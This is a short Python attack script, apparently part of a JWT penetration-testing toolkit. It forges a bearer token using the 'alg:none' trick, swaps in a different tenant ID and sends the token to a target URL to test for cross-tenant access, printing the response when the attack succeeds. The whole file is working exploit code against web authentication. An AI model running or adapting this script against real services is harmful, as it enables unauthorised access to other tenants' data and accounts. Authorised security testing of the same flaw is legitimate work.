import requests
import json
from utils import print_info, print_success, print_error
import forge_claims

def run(token: str, target: str, new_tenant: str):
    print_info(f"Executing Tenant Abuse Attack against {target}")
    print_info(f"Targeting Tenant ID: {new_tenant}")
    
    # Forge token with new tenant and alg:none
    overrides = {"tenant": new_tenant}
    
    try:
        forged_token = forge_claims.forge_none(token, overrides)
    except Exception as e:
        print_error(f"Failed to forge token: {e}")
        return
        
    print_info(f"Forged Payload: {json.dumps(overrides)}")
    print_info("Sending request...")
    
    try:
        resp = requests.get(
            target,
            headers={"Authorization": f"Bearer {forged_token}"},
            timeout=5
        )
        
        if resp.status_code == 200:
            print_success("🚨 Cross-Tenant Access Successful!")
            print_success(f"Response: {resp.text.strip()}")
        else:
            print_error(f"Attack failed ({resp.status_code}): {resp.text.strip()}")
            
    except requests.ConnectionError:
        print_error(f"Failed to connect to {target}")
